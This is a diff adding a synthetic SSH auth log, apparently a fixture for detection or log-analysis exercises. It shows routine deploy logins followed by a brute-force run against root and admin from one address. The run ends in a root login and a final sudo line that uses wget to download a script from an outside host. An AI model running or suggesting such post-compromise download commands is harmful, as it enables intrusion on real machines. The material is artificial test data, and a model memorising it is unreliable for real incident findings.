@@ -1,0 +1,58 @@
+Nov 16 09:00:00 ubuntu-vm sshd[2299]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 09:10:00 ubuntu-vm sshd[7940]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 09:20:00 ubuntu-vm sshd[1042]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 09:20:00 ubuntu-vm CRON[4983]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 16 09:20:01 ubuntu-vm sudo: ayden : TTY=pts/0 ; PWD=/home/ayden ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 16 09:20:02 ubuntu-vm systemd-logind[812]: New session 42 of user ayden.
+Nov 16 09:20:03 ubuntu-vm sshd[9444]: Received disconnect from 192.168.1.10 port 51234:11: disconnected by user
+Nov 16 09:30:00 ubuntu-vm sshd[2731]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 09:40:00 ubuntu-vm sshd[7853]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 09:50:00 ubuntu-vm sshd[8721]: Accepted publickey for deploy from 192.168.1.22 port 51022 ssh2: RSA SHA256:abc123
+Nov 16 10:00:00 ubuntu-vm sshd[6219]: Failed password for root from 203.0.113.9 port 40000 ssh2
+Nov 16 10:00:05 ubuntu-vm sshd[2132]: Failed password for invalid user admin from 203.0.113.9 port 40001 ssh2
+Nov 16 10:00:10 ubuntu-vm sshd[6709]: Failed password for root from 203.0.113.9 port 40002 ssh2
+Nov 16 10:00:15 ubuntu-vm sshd[1770]: Failed password for invalid user admin from 203.0.113.9 port 40003 ssh2
+Nov 16 10:00:20 ubuntu-vm sshd[7104]: Failed password for root from 203.0.113.9 port 40004 ssh2
+Nov 16 10:00:26 ubuntu-vm sshd[5366]: Failed password for invalid user admin from 203.0.113.9 port 40005 ssh2
+Nov 16 10:00:31 ubuntu-vm sshd[1588]: Failed password for root from 203.0.113.9 port 40006 ssh2
+Nov 16 10:00:36 ubuntu-vm sshd[4332]: Failed password for invalid user admin from 203.0.113.9 port 40007 ssh2
+Nov 16 10:00:41 ubuntu-vm sshd[2610]: Failed password for root from 203.0.113.9 port 40008 ssh2
+Nov 16 10:00:46 ubuntu-vm sshd[8655]: Failed password for invalid user admin from 203.0.113.9 port 40009 ssh2
+Nov 16 10:00:52 ubuntu-vm sshd[4680]: Failed password for root from 203.0.113.9 port 40010 ssh2
+Nov 16 10:00:57 ubuntu-vm sshd[6845]: Failed password for invalid user admin from 203.0.113.9 port 40011 ssh2
+Nov 16 10:01:02 ubuntu-vm sshd[3277]: Failed password for root from 203.0.113.9 port 40012 ssh2
+Nov 16 10:01:07 ubuntu-vm sshd[1760]: Failed password for invalid user admin from 203.0.113.9 port 40013 ssh2
+Nov 16 10:01:12 ubuntu-vm sshd[9290]: Failed password for root from 203.0.113.9 port 40014 ssh2
+Nov 16 10:01:18 ubuntu-vm sshd[4315]: Failed password for invalid user admin from 203.0.113.9 port 40015 ssh2
+Nov 16 10:01:23 ubuntu-vm sshd[9051]: Failed password for root from 203.0.113.9 port 40016 ssh2
+Nov 16 10:01:28 ubuntu-vm sshd[4979]: Failed password for invalid user admin from 203.0.113.9 port 40017 ssh2
+Nov 16 10:01:33 ubuntu-vm sshd[5150]: Failed password for root from 203.0.113.9 port 40018 ssh2
+Nov 16 10:01:38 ubuntu-vm sshd[2403]: Failed password for invalid user admin from 203.0.113.9 port 40019 ssh2
+Nov 16 10:01:44 ubuntu-vm sshd[9551]: Failed password for root from 203.0.113.9 port 40020 ssh2
+Nov 16 10:01:49 ubuntu-vm sshd[7658]: Failed password for invalid user admin from 203.0.113.9 port 40021 ssh2
+Nov 16 10:01:54 ubuntu-vm sshd[5442]: Failed password for root from 203.0.113.9 port 40022 ssh2
+Nov 16 10:01:59 ubuntu-vm sshd[9240]: Failed password for invalid user admin from 203.0.113.9 port 40023 ssh2
+Nov 16 10:02:04 ubuntu-vm sshd[6846]: Failed password for root from 203.0.113.9 port 40024 ssh2
+Nov 16 10:02:10 ubuntu-vm sshd[8366]: Failed password for invalid user admin from 203.0.113.9 port 40025 ssh2
+Nov 16 10:02:15 ubuntu-vm sshd[2756]: Failed password for root from 203.0.113.9 port 40026 ssh2
+Nov 16 10:02:20 ubuntu-vm sshd[6930]: Failed password for invalid user admin from 203.0.113.9 port 40027 ssh2
+Nov 16 10:02:25 ubuntu-vm sshd[9083]: Failed password for root from 203.0.113.9 port 40028 ssh2
+Nov 16 10:02:30 ubuntu-vm sshd[6646]: Failed password for invalid user admin from 203.0.113.9 port 40029 ssh2
+Nov 16 10:02:36 ubuntu-vm sshd[2050]: Failed password for root from 203.0.113.9 port 40030 ssh2
+Nov 16 10:02:41 ubuntu-vm sshd[6462]: Failed password for invalid user admin from 203.0.113.9 port 40031 ssh2
+Nov 16 10:02:46 ubuntu-vm sshd[1120]: Failed password for root from 203.0.113.9 port 40032 ssh2
+Nov 16 10:02:51 ubuntu-vm sshd[3564]: Failed password for invalid user admin from 203.0.113.9 port 40033 ssh2
+Nov 16 10:02:56 ubuntu-vm sshd[5907]: Failed password for root from 203.0.113.9 port 40034 ssh2
+Nov 16 10:03:02 ubuntu-vm sshd[1940]: Failed password for invalid user admin from 203.0.113.9 port 40035 ssh2
+Nov 16 10:03:07 ubuntu-vm sshd[1491]: Failed password for root from 203.0.113.9 port 40036 ssh2
+Nov 16 10:03:12 ubuntu-vm sshd[3482]: Failed password for invalid user admin from 203.0.113.9 port 40037 ssh2
+Nov 16 10:03:17 ubuntu-vm sshd[5768]: Failed password for root from 203.0.113.9 port 40038 ssh2
+Nov 16 10:03:22 ubuntu-vm sshd[1945]: Failed password for invalid user admin from 203.0.113.9 port 40039 ssh2
+Nov 16 10:03:28 ubuntu-vm sshd[8292]: Failed password for root from 203.0.113.9 port 40040 ssh2
+Nov 16 10:03:33 ubuntu-vm sshd[9400]: Failed password for invalid user admin from 203.0.113.9 port 40041 ssh2
+Nov 16 10:03:38 ubuntu-vm sshd[7390]: Failed password for root from 203.0.113.9 port 40042 ssh2
+Nov 16 10:03:43 ubuntu-vm sshd[2695]: Failed password for invalid user admin from 203.0.113.9 port 40043 ssh2
+Nov 16 10:03:48 ubuntu-vm sshd[1913]: Failed password for root from 203.0.113.9 port 40044 ssh2
+Nov 16 10:03:54 ubuntu-vm sshd[7178]: Failed password for invalid user admin from 203.0.113.9 port 40045 ssh2
+Nov 16 10:04:02 ubuntu-vm sshd[7375]: Accepted password for root from 203.0.113.9 port 40100 ssh2
+Nov 16 10:04:08 ubuntu-vm sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.200/x.sh
